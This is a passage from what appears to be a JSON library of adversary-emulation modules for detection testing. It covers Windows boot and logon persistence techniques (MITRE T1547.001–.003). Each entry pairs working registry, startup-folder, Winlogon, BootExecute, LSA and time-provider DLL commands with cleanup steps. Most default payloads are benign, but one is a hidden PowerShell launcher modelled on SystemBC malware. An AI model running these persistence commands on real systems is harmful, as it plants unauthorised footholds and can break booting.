      "rx_module_id": "eb44f842-0457-4ddc-9b92-c4caa144ac42",
      "module_name": "PowerShell Registry RunOnce"
    },
    {
      "index": 1271,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$PathToRagloxModulesFolder\\T1547.001\\src\\vbsstartup.vbs\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\nCopy-Item \"$PathToRagloxModulesFolder\\T1547.001\\src\\vbsstartup.vbs\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\ncscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"\ncscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2cb98256-625e-4da9-9d44-f2e5f90b8bd5",
      "module_name": "Suspicious vbs file run from startup Folder"
    },
    {
      "index": 1272,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, \"T1547.001 Hello, World JSE!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$PathToRagloxModulesFolder\\T1547.001\\src\\jsestartup.jse\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\nCopy-Item \"$PathToRagloxModulesFolder\\T1547.001\\src\\jsestartup.jse\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\ncscript.exe /E:Jscript \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\"\ncscript.exe /E:Jscript \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dade9447-791e-4c8f-b04b-3a35855dfa06",
      "module_name": "Suspicious jse file run from startup Folder"
    },
    {
      "index": 1273,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$PathToRagloxModulesFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToRagloxModulesFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore\nRemove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5b6768e4-44d2-44f0-89da-a01d1430fd5e",
      "module_name": "Suspicious bat file run from startup Folder"
    },
    {
      "index": 1274,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"\n$ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Create = $WScriptShell.CreateShortcut($ShortcutLocation)\n$Create.TargetPath = $Target\n$Create.Save()      ",
        "elevation_required": true,
        "cleanup_command": "Remove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "24e55612-85f6-4bd6-ae74-a73d02e3441d",
      "module_name": "Add Executable Shortcut Link to User Startup Folder"
    },
    {
      "index": 1275,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "Add a persistance via Recycle bin [vxunderground](https://github.com/vxunderground/VXUG-Papers/blob/main/The%20Persistence%20Series/Persistence%20via%20Recycle%20Bin/Persistence_via_Recycle_Bin.pdf)\nUser have to clic on the recycle bin to lauch the payload (here calc)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg ADD \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\" /ve /d \"calc.exe\" /f",
        "elevation_required": false,
        "cleanup_command": "reg DELETE \"HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\" /f"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bda6a3d6-7aa7-4e89-908b-306772e9662f",
      "module_name": "Add persistance via Recycle bin"
    },
    {
      "index": 1276,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This RAGLOX will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$RunKey = \"#{reg_key_path}\"\nSet-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"#{reg_key_value}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"socks5_powershell\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "reg_key_value",
          "description": "Thing to Run",
          "type": "path",
          "default_value": "powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File"
        },
        {
          "name": "reg_key_path",
          "description": "Path to registry key to update",
          "type": "path",
          "default_value": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9dc7767b-30c1-4cc4-b999-50cab5e27891",
      "module_name": "SystemBC Malware-as-a-Service Registry"
    },
    {
      "index": 1277,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\"\n",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n"
      },
      "variables": [
        {
          "name": "new_startup_folder",
          "description": "new startup folder to replace standard one",
          "type": "string",
          "default_value": "$env:TMP\\ragloxtest\\"
        },
        {
          "name": "payload",
          "description": "executable to be placed in new startup location ",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "acfef903-7662-447e-a391-9c91c2f00f7b",
      "module_name": "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value"
    },
    {
      "index": 1278,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"\nCopy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"\n",
        "elevation_required": false,
        "cleanup_command": "Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nRemove-Item \"#{new_startup_folder}\" -Recurse -Force\n"
      },
      "variables": [
        {
          "name": "new_startup_folder",
          "description": "new startup folder to replace standard one",
          "type": "string",
          "default_value": "$env:TMP\\ragloxtest\\"
        },
        {
          "name": "payload",
          "description": "executable to be placed in new startup location ",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8834b65a-f808-4ece-ad7e-2acdf647aafa",
      "module_name": "Change Startup Folder - HKCU Modify User Shell Folders Startup Value"
    },
    {
      "index": 1279,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\")){\n  New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\"\n}\nif (!(Test-Path -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\""
      },
      "variables": [
        {
          "name": "target_key_value_name",
          "description": "registry value to crate on target key",
          "type": "string",
          "default_value": "ragloxtest"
        },
        {
          "name": "payload",
          "description": "payload to execute",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a70faea1-e206-4f6f-8d9a-67379be8f6f1",
      "module_name": "HKCU - Policy Settings Explorer Run Key"
    },
    {
      "index": 1280,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (!(Test-Path -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\")){\n  New-Item -ItemType Key -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\n}\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\" -Value \"#{payload}\"\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" -Name \"#{target_key_value_name}\""
      },
      "variables": [
        {
          "name": "target_key_value_name",
          "description": "registry value to crate on target key",
          "type": "string",
          "default_value": "ragloxtest"
        },
        {
          "name": "payload",
          "description": "payload to execute",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b5c9a9bc-dda3-4ea0-b16a-add8e81ab75f",
      "module_name": "HKLM - Policy Settings Explorer Run Key"
    },
    {
      "index": 1281,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n",
        "elevation_required": true,
        "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'"
      },
      "variables": [
        {
          "name": "payload",
          "description": "what to run",
          "type": "string",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f7fab6cc-8ece-4ca7-a0f1-30a22fccd374",
      "module_name": "HKLM - Append Command to Winlogon Userinit KEY Value"
    },
    {
      "index": 1282,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \", #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$newvalue\"\n",
        "elevation_required": true,
        "cleanup_command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Shell\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Shell-backup'"
      },
      "variables": [
        {
          "name": "payload",
          "description": "what to run",
          "type": "string",
          "default_value": "C:\\Windows\\explorer.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1d958c61-09c6-4d9e-b26b-4130314e520e",
      "module_name": "HKLM - Modify default System Shell - Winlogon Shell KEY Value "
    },
    {
      "index": 1283,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "secedit /import /db #{secedit_db} /cfg \"#{ini_file}\"\nsecedit /configure /db #{secedit_db}\n",
        "elevation_required": true,
        "cleanup_command": "REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"calc\" /f >nul 2>&1"
      },
      "variables": [
        {
          "name": "ini_file",
          "description": "INI config template",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder\\T1547.001\\src\\regtemplate.ini"
        },
        {
          "name": "secedit_db",
          "description": "Custom secedit db",
          "type": "string",
          "default_value": "mytemplate.db"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "14fdc3f1-6fc3-4556-8d36-aa89d9d42d02",
      "module_name": "secedit used to create a Run key in the HKLM Hive"
    },
    {
      "index": 1284,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This test modifies the BootExecute registry value to \"autocheck autoche *\", which can be used to simulate an adversary's attempt to tamper with the system's boot process. \nReference - https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\nNOTE that by not saving the correct value, you may inhibit your system from booting properly. Only run on a test system. There is a reg export before running the RAGLOX.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (!(Test-Path \"$PathToRagloxModulesFolder\\T1547.001\\src\\SessionManagerBackup.reg\")) { reg.exe export \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" \"$PathToRagloxModulesFolder\\T1547.001\\src\\SessionManagerBackup.reg\" /y }\nSet-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\" -Name \"BootExecute\" -Value \"#{registry_value}\" -Type MultiString\n",
        "elevation_required": true,
        "cleanup_command": "reg.exe import \"$PathToRagloxModulesFolder\\T1547.001\\src\\SessionManagerBackup.reg\"\nRemove-Item -Path \"$PathToRagloxModulesFolder\\T1547.001\\src\\SessionManagerBackup.reg\" -Force\n"
      },
      "variables": [
        {
          "name": "registry_value",
          "description": "Registry value to set",
          "type": "string",
          "default_value": "autocheck autoche *"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "befc2b40-d487-4a5a-8813-c11085fb5672",
      "module_name": "Modify BootExecute Value"
    },
    {
      "index": 1285,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "When a users logs in to a computer via RDP,Windows will search for the key in HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd registry\nBy default, rdpclip is the value stored. An attacker with administrator privileges can alter the value stored to allow for the custom application to execute during RDP login session.The test will allow running cal rather rdpclip when a user logs in via RDP\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\" /f /v StartupPrograms /t REG_SZ /d \"#{malicious_app}\"\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\" /f /v StartupPrograms /t REG_SZ /d \"rdpclip\""
      },
      "variables": [
        {
          "name": "malicious_app",
          "description": "Application to be executed during successful RDP session",
          "type": "string",
          "default_value": "calc"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b051b3c0-66e7-4a81-916d-e6383bd3a669",
      "module_name": "Allowing custom application to execute during new RDP logon session"
    },
    {
      "index": 1286,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "Microsoft allows users to define a custom boot verification program for those situations by creating the registry key HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram and setting the value of ImagePath to the path of boot verification program.Threat Actor\ncan abuse by creating this registry key and providing a malicious application to be executed during successful boot\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /v ImagePath /t REG_SZ /d \"#{malicious_file}\"\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKLM\\System\\CurrentControlSet\\Control\\BootVerificationProgram /f"
      },
      "variables": [
        {
          "name": "malicious_file",
          "description": "Application to be executed during successful boot",
          "type": "string",
          "default_value": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6e1666d5-3f2b-4b9a-80aa-f011322380d4",
      "module_name": "Creating Boot Verification Program Key for application execution during successful boot"
    },
    {
      "index": 1287,
      "technique_id": "T1547.001",
      "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "description": "This RAGLOX module add persistence taking advantage of the  Windows Context Menu [Hexacorn](https://www.hexacorn.com/blog/2018/07/29/beyond-good-ol-run-key-part-82/)\nUser have to right click on the main screen or in the white space of the opened folder (e.g. Size Modify).\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\\command\" /ve /t REG_SZ /d \"C:\\Windows\\System32\\calc.exe\" /f",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Size Modify\" /f"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "de47f4a0-2acb-416d-9a6b-cee584a4c4d1",
      "module_name": "Add persistence via Windows Context Menu"
    },
    {
      "index": 1288,
      "technique_id": "T1547.002",
      "technique_name": "Authentication Package",
      "description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Copy-Item \"$PathToRagloxModulesFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\" /f\nrm -force C:\\windows\\system32\\package.dll\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "be2590e8-4ac3-47ac-b4b5-945820f2fbe9",
      "module_name": "Authentication Package"
    },
    {
      "index": 1289,
      "technique_id": "T1547.003",
      "technique_name": "Time Providers",
      "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file RAGLOXTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "net stop w32time\nCopy-Item \"$PathToRagloxModulesFolder\\T1547.003\\bin\\RAGLOXTest.dll\" C:\\Users\\Public\\RAGLOXTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\RAGLOXTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\RAGLOXTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\RAGLOXTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\RAGLOXTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n",
        "elevation_required": true,
        "cleanup_command": "net stop w32time\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\RAGLOXTest\" /f\nrm -force C:\\Users\\Public\\RAGLOXTest.dll\nnet start w32time\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "df1efab7-bc6d-4b88-8be9-91f55ae017aa",
      "module_name": "Create a new time provider"
    },
    {
      "index": 1290,
      "technique_id": "T1547.003",
      "technique_name": "Time Providers",
      "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file RAGLOXTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "net stop w32time\nCopy-Item \"$PathToRagloxModulesFolder\\T1547.003\\bin\\RAGLOXTest.dll\" C:\\Users\\Public\\RAGLOXTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\RAGLOXTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n",
        "elevation_required": true,
        "cleanup_command": "net stop w32time\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Windows\\SYSTEM32\\w32time.DLL\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"0\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"0\" /f\nrm -force C:\\Users\\Public\\RAGLOXTest.dll\nnet start w32time\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "29e0afca-8d1d-471a-8d34-25512fc48315",
      "module_name": "Edit an existing time provider"
    },
    {
      "index": 1291,
      "technique_id": "T1547.004",
      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
